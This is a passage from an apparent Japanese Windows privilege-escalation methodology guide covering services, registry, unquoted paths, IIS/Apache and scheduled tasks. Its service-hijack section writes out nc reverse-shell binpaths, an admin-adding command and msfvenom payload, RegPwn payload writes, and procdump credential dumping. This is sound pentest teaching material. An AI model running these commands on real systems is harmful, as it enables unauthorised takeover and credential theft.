powershell -command "Get-Clipboard"
```

## 実行中のプロセス

### ファイルとフォルダーのアクセス許可

まず、プロセスを一覧表示し、**プロセスのコマンドラインにパスワードが含まれていないか確認してください**。\
**実行中のバイナリを上書きできるか**、またはバイナリがあるフォルダーへの書き込み権限があるか確認し、[**DLL Hijacking attacks**](dll-hijacking/index.html)を実行できるか調べてください。

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

常に実行中の[**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)がないか確認してください。これを悪用して権限昇格できる可能性があります。

debugger listenerは短時間しか存在しないことがあるため、ある時点の受動的なポートスナップショットに見つからなくても、これまで公開されていなかった証拠にはなりません。検出したlistenerについて、PID、プロセスの所有者、低権限ユーザーからアクセス可能かどうかを照合してください。アプリケーション名やdebugフラグだけでは、ユーザー間のコード実行が可能だとは判断できません。通常の列挙は受動的に行い、debuggerコマンドは送信しないでください。

**プロセスのバイナリの権限を確認する**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**プロセスのバイナリがあるフォルダーのアクセス許可を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor directories

Snort 2 は、`snort.exe -c <config>` で選択した設定ファイルに宣言された `dynamicpreprocessor directory` から共有ライブラリをロードできます。別のアカウントで Snort を実行するスケジュールタスクやサービスについては、その設定ファイルと、宣言されたモジュールディレクトリの ACL を確認してください。自分のトークンでそのディレクトリにファイルを作成できる場合、そのタスクまたはサービスが次にモジュールをロードするときに code execution が起きる可能性があるため、調査対象となります。昇格が成立するとは限らないため、実行アカウントの有効な権限、アクティブな設定、モジュールの互換性、拒否設定や共有制限を確認してください。ランタイムでのモジュールロードについては、[Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) を参照してください。

### 書き込み可能なドキュメントルートを持つ特権 Web サービス

Windows の Apache インストール環境では、サービスの実行ファイルパスと実行アカウントを、アクティブな `httpd.conf` の `DocumentRoot` と照合してください。一般的な XAMPP の構成では、`C:\xampp\apache\conf\httpd.conf` と、設定されているドキュメントルート（多くの場合は `C:\xampp\htdocs`）の ACL を確認します。Apache が `LocalSystem` として実行されている間に、低い権限のユーザーがそのルートにファイルを作成できる場合、サーバー側の code execution によってホストの権限境界を越えられる可能性があります。サービスが実行中であること、正確なパスが配信対象であること、サーバー側のハンドラーがそのファイル形式を処理することを確認してください。ルートが書き込み可能であるだけでは、ファイルを作成できることしか証明できません。書き込みテストをせずに ACL を確認します:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

一般的な WAMP インストールでは、サービスがバージョン付きの `C:\wamp64\bin\apache\apache*\bin\httpd.exe`（32-bit の構成では `C:\wamp\...`）を指し、その隣の `conf\httpd.conf` に設定ファイルがあり、デフォルトのルートが `C:\wamp64\www` または `C:\wamp\www` になっている場合があります。正確なサービスの実行イメージ、実行アカウント、実効 `DocumentRoot`（`${INSTALL_DIR}` の展開や virtual-host による上書きを含む）、ルートの ACL を合わせて確認してください。WAMP ディレクトリに書き込み可能であることだけでは、Apache が `SYSTEM` として実行されることや、提出したファイルが実行されることの証明にはなりません。[Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service)。

### 書き込み可能な IIS ルートと application-pool のネットワーク ID

IIS では、書き込み可能な物理ディレクトリを `applicationHost.config` 内の**有効な site/application** に対応付け、設定された pool とサーバー側 handler を特定します。配信ディレクトリに置いたコードが pool として実行されるのは、IIS がそのファイルタイプを処理し、かつそのルートに到達できる場合だけです。書き込み可能なディレクトリをコード実行とみなす前に、現在のユーザーの実効的なファイル作成権限、site の実行状態、handler、パスごとの上書き設定を確認してください。

ASP.NET の動的コンパイルについては、アプリケーションのコンパイルディレクトリに生成されるファイルも別途確認が必要です。デフォルトでは、該当する .NET Framework インストール配下の `Temporary ASP.NET Files` ディレクトリですが、アプリケーションの `<compilation tempDirectory>` によって変更できます。[Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) および [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)。低い権限の token が**特定の**アプリケーションの cache 内にある生成ソースを変更できる場合、そのアプリケーションが、より高い権限の [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) で再コンパイルするかどうかを確認してください。ファイルやディレクトリの ACL だけではコード実行の証明になりません。cache と有効なアプリケーション、実効 token と ACL、コンパイル設定、プロセス ID、再コンパイルのタイミングを照合してください。読み取り専用のメタデータ確認にとどめ、列挙中にコンパイルを誘発したり cache ファイルを変更したりしないでください。

`ApplicationPoolIdentity` または `NetworkService` として設定された IIS pool は、ローカル token の権限が低くても、通常は**ホストコンピューターのアカウント**としてドメインリソースに認証します。`LocalSystem` はローカルですでに高い権限を持ち、ネットワーク上でもコンピューターアカウントを使用します。一方、`LocalService` は通常、匿名のネットワーク資格情報を提示します。`SpecificUser` pool は、設定されたアカウントを使用します。[Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) および [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)。ID 設定が省略されている場合、pool のデフォルト設定が引き継がれることがあり、デフォルトは IIS の世代によって異なるため、pool 名から推測せず実効設定を特定してください。コード実行がコンピューターアカウントのネットワーク ID を持つ pool に到達する場合は、**その特定のコンピューター**のディレクトリ権限を評価してください。[DCSync](../active-directory-methodology/dcsync.md) にはドメイン命名コンテキストに対するレプリケーション権限が必要です。マシンアカウントの ticket やホストの役割だけでは、その権限の証明にはなりません。受動的な列挙では、ファイルのアップロード、ネットワーク認証、ticket の要求を行わずに、設定と ACL を確認してください。

helper process を起動する読み取り可能な ASP.NET handler については、request 由来の値が認証、復号、検証、コマンド構築を通る経路を追跡してください。復号した token を `ProcessStartInfo("cmd", "/c ...")` に連結する handler では、shell のメタ文字によってコマンドが変更される可能性があります。[Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)。信頼できない caller が実際に復号後の値を制御でき、handler に到達できることを確認してから、実効的な application-pool または impersonated identity と子プロセスの ID を特定してください。読み取り可能なソースコードの一行、localhost listener、または token 形式の弱点だけでは、特権コマンド実行の証明にはなりません。受動的な列挙中は、偽造した request を送信したり helper を実行したりせずに、ソースと pool の設定を確認してください。

Windows 上の PHP service では、request で制御可能なパスが [`include` または `require`](https://www.php.net/manual/en/function.include.php) に渡されると、worker の ID で低権限ユーザーが書き込み可能な PHP ファイルを評価する可能性があります。request がその文に到達できること、解決されたパスが低権限ユーザーに変更可能で worker が読み取り可能なファイルを指していること、適用される PHP のパス制限が include を許可していること、worker が実際により高い権限で実行されていることを確認してください。loopback listener や書き込み可能なファイルだけでは、この一連の条件を証明できません。受動的な列挙中に endpoint を呼び出すことなく、ソース、service の ID、ファイル ACL を確認してください。

### メモリからのパスワードマイニング

sysinternals の **procdump** を使うと、実行中のプロセスのメモリダンプを作成できます。FTP などの service では、**資格情報がメモリ上に平文で存在する**場合があります。メモリをダンプして資格情報を読み取ってみてください。

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### 安全でないGUIアプリ

**SYSTEMとして実行されるアプリケーションでは、ユーザーがCMDを起動したり、ディレクトリを参照したりできる場合があります。**

例: 「Windowsヘルプとサポート」（Windows + F1）で「command prompt」を検索し、「Click to open Command Prompt」をクリックします。

### 特権ユーザーによるプロジェクトファイルのインポート

低権限ユーザーが書き込み可能なドロップディレクトリからプロジェクトを自動的に開くアプリケーションは、インポーターのアカウントにおいて入力の信頼境界をまたぎます。**実際に書き込み可能なパス**、そのファイルを開くプロセスまたはタスク、実効ID、パーサーのビルドを確認してください。[過去のGhidraプロジェクトのオープン／復元に関する問題](https://github.com/NationalSecurityAgency/ghidra/issues/71)では、プロジェクトメタデータ内のXML外部エンティティが許可されていました。Windows上でネットワークエンティティを使うと、[送信SMBとNTLMのポリシー](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking)によっては、インポートするアカウントの認証情報が送信される可能性があります。これは認証情報漏えいにつながる手掛かりであり、ただちに管理者アクセスが得られるわけではありません。応答を利用するには、別の認可済みまたは脆弱な経路が必要です。また、現行ビルドについては、実際のパッチ適用状況を確認してください。受動的な列挙中に細工したプロジェクトを開かないでください。インポートのワークフローとACLを調査します。

## Services

Service Control Manager（SCM）オブジェクトの[`SC_MANAGER_CREATE_SERVICE`権限](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)は、既存のサービスに対する権限とは別です。この権限を指定した読み取り専用の[`OpenSCManager`アクセス要求](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw)が成功しても、それは調査の手掛かりであり、新しいサービスを実行できる証明ではありません。[`CreateService`はハンドルを返します](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew)。作成時には要求したサービスアクセス権を持つハンドルが返されますが、後でサービスを再度開くと別途アクセスチェックが行われ、元のハンドルを使用できる場合でも失敗することがあります。実効ローカルまたはリモートトークン、付与されたハンドル権限、サービスアカウント、起動ポリシー、実行ファイルパスをそれぞれ確認してください。受動的な列挙中にサービスを作成または起動しないでください。

リモートのサービスインストール経路を調べる場合は、SCM権限に加えて、対象上の共有に**同じネットワークログオン**で書き込めるか、その共有の基盤となるNTFS ACL、サービスアカウントが実行できるローカル実行ファイルパスがあるかを照合してください。SCM権限が異常に広く、ファイルを配置できる経路もある場合、非管理者アカウントでもこの境界を越える可能性があります。管理共有は必須条件ではありません。共有への書き込み権限だけ、またはSCMのサービス作成権限があるという手掛かりだけでは、新しいサービスをより高い権限で起動できるとは言えません。

既存のサービスは、`ImagePath`に指定されたファイルがなくても、起動時、シャットダウン時、または別のライフサイクルイベント時にヘルパー実行ファイルを呼び出すことがあります。ヘルパー名が低権限ユーザーの書き込み可能なディレクトリに解決され、サービスがより高い権限で実行される場合、欠落しているヘルパーファイルは条件付きの置き換え候補になります。**実際のサービスコードまたは文書化されたヘルパーの呼び出し**、解決される実行ファイルパスと検索順序、ディレクトリの作成権限、サービスID、利用可能なライフサイクルトリガーを確認してください。書き込み可能なサービスディレクトリやファイルの欠落だけでは、サービスがそのファイルを読み込むとは言えません。受動的な調査では、サービスを起動または停止しないでください。

既存のサービスでは、[`SERVICE_START`により`StartService`へ引数を渡せます](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)。これは[`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)とは別の権限です。起動権限を単なる制御権以上のものとして扱う前に、サービスのコードまたは文書化されたインターフェイスを確認してください。呼び出し元が選んだ引数をログまたはエクスポート先のパスとして使用する場合は、サービスID、引数から書き込みに至る正確な処理、パス制限、**作成されるファイル**の権限を確認してください。保護されたディレクトリへの書き込みが権限昇格につながるのは、そのファイルを受け入れる別の特権コンシューマーまたはローダーがある場合に限られます。書き込み可能なログや起動権限だけでは不十分です。受動的な調査では、サービスを起動したり、テストファイルを作成したりしないでください。

NSClient++監視エージェントでは、読み取り可能な`nsclient.ini`は**設定確認の手掛かり**です。Web認証情報が含まれる場合があり、`boot.ini`によって設定の読み込み先が別の場所に変更されている可能性もあります。実際のサービスアカウント、WEBリスナーとアクセス制御ポリシー、認証済みロールが設定やスクリプトを変更できるかを確認してください。特権実行にはさらに、`CheckExternalScripts`（または有効な別の実行経路）、コマンドの登録または変更を行う実効権限、そのコマンドをサービスIDで実行するトリガーが必要です。ループバック限定のリスナーでもローカルユーザーから到達できる場合がありますが、ファイルパス、パスワード、またはリスナーが存在するだけでは、これらの権限があるとは言えません。受動的な列挙中は、メタデータと権限を確認し、シークレットを表示したりWeb APIを呼び出したりしないでください。[NSClient++のファイル構成](https://nsclient.org/docs/concepts/file-layout/)、[Webとスクリプトのセキュリティに関するガイダンス](https://nsclient.org/docs/setup/securing/)、[外部スクリプトの設定](https://nsclient.org/docs/reference/check/CheckExternalScripts/)を参照してください。

`ImagePath`が`nssm.exe`のサービスでは、サービスの実際の実行アカウントと、そのサービスの`HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`値を確認してください。[NSSMは子アプリケーションをその場所に保存します](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h)。`AppDirectory`は設定された作業ディレクトリです。ラッパーの権限だけでサービス境界全体を判断せず、子実行ファイルとその親ディレクトリのACLを確認してください。その子が公開するローカルWCFまたはSOAPエンドポイントは、別途調査すべき手掛かりです。低権限ユーザーからリスナーに到達できるか、特定の操作がそのユーザーの入力を受け入れるか、サービスの子プロセスがより高い権限で危険な操作を実行するかを確認してください。サービスアカウント、エンドポイントURL、または書き込み可能なパスだけでは権限昇格の証明になりません。受動的な列挙中は、サービス操作を呼び出さないでください。

カスタムWCF操作では、呼び出し元が制御する文字列がPowerShell runspaceに渡されるまでの流れを追跡してください。[`Pipeline.Commands.AddScript`はスクリプトテキストを追加し](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript)、[`Pipeline.Invoke`はパイプラインを実行します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)。[Windowsトランスポート認証を使う`netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding)はクライアントを認証しますが、その**特定の**操作を呼び出す権限とrunspaceの実効IDは別途確認する必要があります。低権限の呼び出し元の入力から、より高いサービスIDで実行される`AddScript`までの経路は、コード実行の境界です。リスニングポート、認証済みクライアント、または無関係なアセンブリ内の未使用メソッドだけでは証明になりません。列挙中にエンドポイントを呼び出さず、デプロイ済みサービス、コントラクト、認可、偽装の設定を静的に調査してください。

Service Triggersを使うと、特定の条件（名前付きパイプ／RPCエンドポイントのアクティビティ、ETWイベント、IPの利用可能状態、デバイスの接続、GPOの更新など）が発生したときにWindowsがサービスを起動できます。SERVICE_START権限がなくても、トリガーを発生させることで特権サービスを起動できる場合があります。列挙と有効化の手法については、こちらを参照してください。

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio診断コレクターサービス

C/C++ツールを含むVisual Studioのインストール環境には、`LocalSystem`として実行されるよう設定された診断サービス`VSStandardCollectorService150`が含まれる場合があります。[CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/)では、junctionとobject-manager-linkの競合を利用して、サービスのDACLリセット先をリダイレクトしました。実証された権限昇格には、利用可能なVisual Studio Setup WMI ProviderのMSI修復経路と、その修復対象である`C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`も必要でした。このコンポーネントは2024年1月に修正されました。

受動的なトリアージでは、このサービスのアカウントとバイナリパスを確認し、Setup WMIコンパイラのパスが存在するか調べ、インストール済みコンポーネントのパッチ適用状況を確認してください。サービスエントリ、Visual Studio製品のバージョン、またはコンパイラファイルだけでは、ホストに脆弱性があるとは言えません。確認のためにサービスを起動したり、修復を実行したりする必要はありません。

サービスの一覧を取得します:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### 権限

**sc** を使用してサービスの情報を取得できます。

```bash
sc qc <service_name>
```

各サービスで必要な権限レベルを確認するために、_Sysinternals_ の **accesschk** を用意しておくことを推奨します。

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

「Authenticated Users」がサービスを変更できるかどうか確認することを推奨します:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP 用の accesschk.exe はこちらからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

（たとえば SSDPSRV で）次のエラーが発生した場合:

_システム エラー 1058 が発生しました。_\
_サービスは無効になっているか、関連付けられた有効なデバイスがないため、開始できません。_

次の方法で有効にできます。

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**サービス upnphost が動作するには SSDPSRV に依存している点に注意してください（XP SP1の場合）**

**この問題に対する別の回避策**は、次を実行することです:

```
sc.exe config usosvc start= auto
```

### **サービスバイナリパスの変更**

「Authenticated users」グループがサービスに対する **SERVICE_ALL_ACCESS** を持つ場合、サービスの実行バイナリを変更できます。**sc** を変更して実行するには：

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### サービスを再起動する

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

権限を通じて、さまざまな方法で権限昇格が可能です。

- **SERVICE_CHANGE_CONFIG**: サービスのバイナリを再構成できます。
- **WRITE_DAC**: 権限を再構成でき、サービス設定を変更できるようになります。
- **WRITE_OWNER**: 所有権を取得し、権限を再構成できます。
- **GENERIC_WRITE**: サービス設定を変更する権限を継承します。
- **GENERIC_ALL**: サービス設定を変更する権限も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの脆弱な権限

サービスが **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権を持つドメインアカウントとして実行されており、**低権限ユーザーがサービスの EXE またはその親フォルダーを変更できる場合**、多くの場合、**バイナリを置き換えてサービスを再起動することで**サービスを乗っ取れます。

**サービスによって実行されるバイナリを変更できるか**、またはバイナリが置かれている**フォルダーへの書き込み権限があるか**を確認してください ([**DLL Hijacking**](dll-hijacking/index.html))**。**\
サービスによって実行されるすべてのバイナリは **wmic**（system32 にはありません）を使って取得でき、**icacls** で権限を確認できます：

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

**sc** および **icacls** も使用できます:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービスの実行ファイルまたはそのファイルが置かれたディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実用的な悪用の流れは次のとおりです。<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能か確認します。
3. サービスのバイナリを payload または有効な悪意あるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または、再起動／サービスのトリガーを待ちます）。

便利な自動チェック:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> サービスが一般ユーザーによる再起動を許可していない場合は、起動時に自動で開始されるか、失敗時のアクションで再起動するか、またはそのサービスを使用するアプリケーションによって間接的に起動できるかを確認してください。

### サービスのレジストリ変更権限

サービスのレジストリを変更できるかどうかを確認してください。\
次の方法で、サービスの**レジストリ**に対する**権限**を**確認**できます。

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

特定のサービスキーに対して、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が書き込み可能なレジストリ権限を持つか確認します。ACL エントリがあるだけでは、実効アクセスがあるとは限りません。拒否エントリ、現在のトークン、継承された権限も考慮する必要があります。レジストリキーの権限は、サービスオブジェクトの `SERVICE_CHANGE_CONFIG` および `SERVICE_START` 権限とは別です。権限昇格にはさらに、利用可能なサービス構成フィールド、サービスを起動する方法、およびより高い権限を持つサービス ID が必要です。Microsoft の[レジストリキーの権限](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)と[サービスのアクセス権に関するリファレンス](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)を参照してください。

実行されるバイナリの Path を変更するには:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race による任意の HKLM value write（ATConfig）

一部の Windows アクセシビリティ機能は、ユーザーごとの **ATConfig** キーを作成します。このキーは後に **SYSTEM** プロセスによって HKLM のセッションキーにコピーされます。Registry **symbolic link race** により、この特権的な書き込み先を **任意の HKLM パス**にリダイレクトし、任意の HKLM **value write** を実現できます。<sup>[[18]](#references)</sup>

主な場所（例：スクリーン キーボード `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みのアクセシビリティ機能が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御可能な設定が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は、ログオン時や secure-desktop への切り替え時に作成され、ユーザーが書き込み可能です。

悪用の流れ（CVE-2026-24291 / ATConfig）:

1. SYSTEM に書き込ませたい値を **HKCU ATConfig** に設定します。
2. secure-desktop へのコピーをトリガーします（例：**LockWorkstation**）。これにより AT broker の処理が開始されます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定し、**race に勝ちます**。oplock が発動したら、**HKLM Session ATConfig** キーを保護対象の HKLM キーを指す **registry link** に置き換えます。
4. SYSTEM が、攻撃者の指定した値をリダイレクト先の HKLM パスに書き込みます。

任意の HKLM value write が可能になったら、サービス設定値を上書きして LPE に進みます。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE / コマンドライン）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常のユーザーが起動できるサービス（例：**`msiserver`**）を選び、書き込み後に起動します。**注:** 公開されている exploit の実装では、race の一環としてワークステーションをロックします。

ツールの例（RegPwn BOF / standalone）:<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### サービス レジストリの AppendData/AddSubdirectory 権限

レジストリに対してこの権限がある場合、そのレジストリの下にサブレジストリを作成できます。Windows サービスの場合、これは**任意のコードを実行するのに十分です。**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルのパスが引用符で囲まれていない場合、Windows はスペースの前までの各文字列を実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次のファイルを実行しようとします。

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

組み込み Windows サービスに属するものを除き、引用符で囲まれていないサービスパスをすべて一覧表示します：

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**この脆弱性は** metasploit: `exploit/windows/local/trusted\_service\_path` **で検出・悪用できます。metasploitを使ってサービスバイナリを手動で作成できます:**

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### 回復アクション

Windows では、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能では、バイナリを指定できます。そのバイナリを置き換え可能な場合、権限昇格が可能なことがあります。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## スケジュールされたタスクのスクリプトターゲット

有効なタスクが `.bat` または `.cmd` ファイルを指定して `cmd.exe /c` を実行する場合は、`cmd.exe` だけでなく、**action arguments** に指定されたスクリプトも確認してください。PowerShell の `-File` など、インタープリターに明示的なファイル引数を渡す場合も同様です。スケジュールされたバッチファイルに PowerShell の `-File` 呼び出しがリテラルで含まれている場合は、参照先スクリプトの ACL も調べてください。変数、条件分岐、シェルの連結がある場合は、手動で追跡する必要があります。呼び出し元が書き込み可能なスクリプトや親ディレクトリが、アカウントをまたぐ実行の手掛かりとなるのは、設定されたタスクのプリンシパルが呼び出し元と異なり、かつタスクが実際にそのアクションに到達する場合に限られます。スクリプトでは追記のみ可能な ACL が問題になることがありますが、先行する `exit` などの制御フローによって、追記した行が実行されない場合もあります。権限昇格を主張する前に、実効 ACL、[タスクの実行コンテキスト](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)、作業ディレクトリ、トリガー、アプリケーション制御ポリシーを確認してください。インベントリ調査でスクリプトを変更したり、タスクを開始したりしてはいけません。

## アクセス可能なファイルの名前付きストリーム

NTFS では、読み取り可能なファイルに名前付き `:$DATA` ストリームが含まれていることがあり、その内容は通常のディレクトリ一覧には表示されません。アクセス可能なバックアップファイルや設定ファイルのうち、関連性の高い少数のファイルを対象に、内容を開く前にストリームの**名前とサイズ**を確認してください。Windows では [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) から、PowerShell では [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) から確認できます。秘密情報を示唆するストリーム名は、あくまで手掛かりです。ファイルに対する実効読み取り権限、ファイルシステムのストリーム対応状況、ストリームに利用可能な認証情報が含まれているか、そしてその認証情報で実際にどのアカウントとして認証されるかを確認してください。通常の列挙では、再帰的なストリームスキャンやストリーム内容の出力は避けてください。

## スケジュールされた Windows Driver Kit ヘルパーの入力ファイル

オプションの Windows Driver Kit には `StandaloneRunner.exe` が含まれており、実行ディレクトリにある `command.txt`、`reboot.rsf`、およびプロジェクトの `working\rsf.rsf` ファイルを読み込むことがあります。特権アカウントでこのヘルパーを起動するスケジュールされたタスクやサービスがある場合、ヘルパーの実行ファイル自体が保護されていても、これらの入力ファイルへの低権限ユーザーの書き込みアクセスが、そのアカウントのコンテキストでのコマンド実行につながる可能性があります。特権で実行する側が存在することと、**両方の**サイドカーファイルを作成または変更できることを確認してください。ヘルパーを見つけただけでは不十分です。

